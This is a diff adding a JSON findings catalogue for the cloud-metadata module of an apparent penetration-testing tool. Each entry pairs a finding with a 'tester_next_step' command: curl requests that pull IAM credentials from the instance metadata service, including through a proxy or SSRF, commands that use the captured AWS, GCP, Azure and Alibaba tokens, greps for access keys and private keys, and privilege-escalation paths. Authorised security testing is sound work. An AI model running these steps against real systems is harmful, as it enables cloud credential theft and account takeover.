@@ -1,0 +1,157 @@
+{
+  "service": "cloud_metadata",
+  "module_files": [
+    "recce/services/cloud_metadata.py"
+  ],
+  "summary": "Opportunistic IMDS probe (from runner box, session-side, or via SSRF). When credentials come back, this is T3 initial-access on the cloud plane. Uniquely, exploit_via_ssrf turns a crawler-confirmed SSRF into real STS credential extraction \u2014 that is T4 chain. Every credential finding is a live capture, not a posture claim.",
+  "findings": [
+    {
+      "kind": "imds_reachable_from_host",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "Cloud IMDS reachable from this host",
+      "tier_evidence": "Link-local IMDS answered ONLY from inside a cloud VPC \u2014 deterministic vuln signal (from the runner's context).",
+      "can_promote_to": "t3",
+      "promotion_notes": "Chain into imds_iam_credentials_exposed / gcp_service_account_token_exposed / azure_managed_identity_token_exposed (module already does when tokens are returned).",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -s http://169.254.169.254/latest/meta-data/  # from the runner or a session on the host"
+    },
+    {
+      "kind": "cloud_provider_identified",
+      "tier": "t0",
+      "severity": "info",
+      "title_pattern": "Cloud provider identified",
+      "tier_evidence": "Dialect fingerprint.",
+      "can_promote_to": "stay",
+      "promotion_notes": "n/a",
+      "promotion_risk": "none",
+      "tester_next_step": "n/a \u2014 informational label used to steer per-provider probes"
+    },
+    {
+      "kind": "imds_v1_enabled",
+      "tier": "t1",
+      "severity": "critical",
+      "title_pattern": "AWS IMDSv1 enabled (token-free read allowed)",
+      "tier_evidence": "GET /latest/meta-data/ answers 200 WITHOUT the X-aws-ec2-metadata-token header \u2014 deterministic.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Chain with imds_iam_credentials_exposed to pull tokens without needing a mint call.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/  # token-free"
+    },
+    {
+      "kind": "imds_iam_credentials_exposed",
+      "tier": "t3",
+      "severity": "critical",
+      "title_pattern": "AWS IAM role credentials exposed via IMDS",
+      "tier_evidence": "recce pulled a full STS AccessKeyId + SecretAccessKey + SessionToken JSON \u2014 that IS a live foothold on the AWS control plane. Not proof-of-concept, actual working credential.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Auto-run `aws sts get-caller-identity`, then enumerate role permissions with iam.list_attached_role_policies, then try common escalations (iam:PassRole, secretsmanager:GetSecretValue).",
+      "promotion_risk": "medium",
+      "tester_next_step": "export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... ; aws sts get-caller-identity ; aws iam list-attached-role-policies --role-name <role> ; aws s3 ls ; aws secretsmanager list-secrets"
+    },
+    {
+      "kind": "imds_user_data_secrets",
+      "tier": "t3",
+      "severity": "critical",
+      "title_pattern": "AWS user-data leaks credential-shaped secrets",
+      "tier_evidence": "Real regex hits on real user-data text \u2014 passwords, AKIAs, private keys, github tokens are extracted verbatim.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Push extracted AKIAs into aws_probe / secretsmanager loop; feed private keys into ssh_key_store for lateral SSH.",
+      "promotion_risk": "medium",
+      "tester_next_step": "grep -Eo 'AKIA[0-9A-Z]{16}|-----BEGIN[^-]+PRIVATE KEY-----' <user-data-dump>  ; then aws sts get-caller-identity with each key"
+    },
+    {
+      "kind": "gcp_service_account_token_exposed",
+      "tier": "t3",
+      "severity": "critical",
+      "title_pattern": "GCP service-account OAuth2 access token exposed via IMDS",
+      "tier_evidence": "Live OAuth2 access_token; usable directly as Authorization: Bearer against any Google API.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Auto-enum: projects.get, iam.serviceAccounts.list, secretmanager.list; if broad, try cross-project impersonation.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -H 'Authorization: Bearer <token>' https://cloudresourcemanager.googleapis.com/v1/projects/<project>/getIamPolicy ; gcloud auth activate-service-account --key-file=<key.json>"
+    },
+    {
+      "kind": "azure_managed_identity_token_exposed",
+      "tier": "t3",
+      "severity": "critical",
+      "title_pattern": "Azure managed identity access token(s) exposed via IMDS",
+      "tier_evidence": "Live MSI JWTs for multiple audiences (ARM, storage, keyvault, graph).",
+      "can_promote_to": "t4",
+      "promotion_notes": "Auto-enum: /subscriptions/{sub}/resourceGroups; then keyvault.getSecret and blob container list; MS Graph directory read.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -H 'Authorization: Bearer <arm-token>' https://management.azure.com/subscriptions?api-version=2020-01-01 ; az account get-access-token --tenant <sub>"
+    },
+    {
+      "kind": "alibaba_ram_credentials_exposed",
+      "tier": "t3",
+      "severity": "critical",
+      "title_pattern": "Alibaba Cloud RAM STS credentials exposed via IMDS",
+      "tier_evidence": "Live temporary RAM STS keys extracted.",
+      "can_promote_to": "t4",
+      "promotion_notes": "aliyun cli / OSS list; escalate through ram:ListPoliciesForRole.",
+      "promotion_risk": "medium",
+      "tester_next_step": "export ALIBABA_CLOUD_ACCESS_KEY_ID=... ALIBABA_CLOUD_ACCESS_KEY_SECRET=... ALIBABA_CLOUD_SECURITY_TOKEN=... ; aliyun sts GetCallerIdentity"
+    },
+    {
+      "kind": "imds_reachable_via_proxy",
+      "tier": "t2",
+      "severity": "critical",
+      "title_pattern": "IMDS reachable through host's HTTP proxy (Capital One 2019 pattern)",
+      "tier_evidence": "The probe SUCCEEDS only if a proxy on the host actively forwards to link-local (via absolute-URI or CONNECT) and IMDS answers \u2014 that is a proof-of-concept that any SSRF becomes cloud creds.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Use proxy to fetch security-credentials/<role> and stash the STS keys.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -x http://<proxy-host>:8080 http://169.254.169.254/latest/meta-data/iam/security-credentials/  # if roles listed, pull the credential JSON via the same proxy"
+    },
+    {
+      "kind": "imdsv2_hop_limit_too_high",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "IMDSv2 hop-limit too high (referenced in module doc but not emitted)",
+      "tier_evidence": "Doc lists this kind but the module code emits no such finding.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Add: after mint_token, read the response 'X-Aws-Ec2-Metadata-Token-Ttl-Seconds' echo; separately parse the hop-limit from instance metadata options (which requires cred). Not straightforward pre-auth.",
+      "promotion_risk": "low",
+      "tester_next_step": "aws ec2 describe-instances --instance-ids <id> --query 'Reservations[].Instances[].MetadataOptions'  # needs a credential"
+    },
+    {
+      "kind": "instance_identity_disclosed",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "AWS/GCP/Azure/DO instance identity document disclosed",
+      "tier_evidence": "Identity document read \u2014 recon for accountId/subscriptionId/projectId.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Feed accountId to phishing/enum.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -s http://169.254.169.254/latest/dynamic/instance-identity/document"
+    },
+    {
+      "kind": "imds_ssh_public_keys_disclosed",
+      "tier": "t0",
+      "severity": "low",
+      "title_pattern": "AWS instance SSH public keys disclosed via IMDS",
+      "tier_evidence": "Public-keys read.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Correlation with sightings elsewhere.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -s http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key ; then grep across engagement authorized_keys mines"
+    },
+    {
+      "kind": "web_ssrf_reaches_imds_credentials",
+      "tier": "t4",
+      "severity": "critical",
+      "title_pattern": "Web SSRF chained through to IMDS credential extraction",
+      "tier_evidence": "This is a CHAIN: crawler-confirmed SSRF is replayed through the vulnerable parameter against IMDS, and real STS/OAuth2/MSI credentials come back. exploit_via_ssrf is initiated by crawl.py and lands in this finding \u2014 the loop from bug to cloud-plane cred is closed.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Already a full chain. Add: post-crack usage against ARM/AWS API to prove control.",
+      "promotion_risk": "medium",
+      "tester_next_step": "Use the captured STS keys immediately: aws sts get-caller-identity ; then map the role's IAM policy and pursue AdministratorAccess / iam:PassRole paths."
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "cred_store",
+    "known_domains (accountId/projectId)",
+    "session_state (agent-side probing)"
+  ]
+}
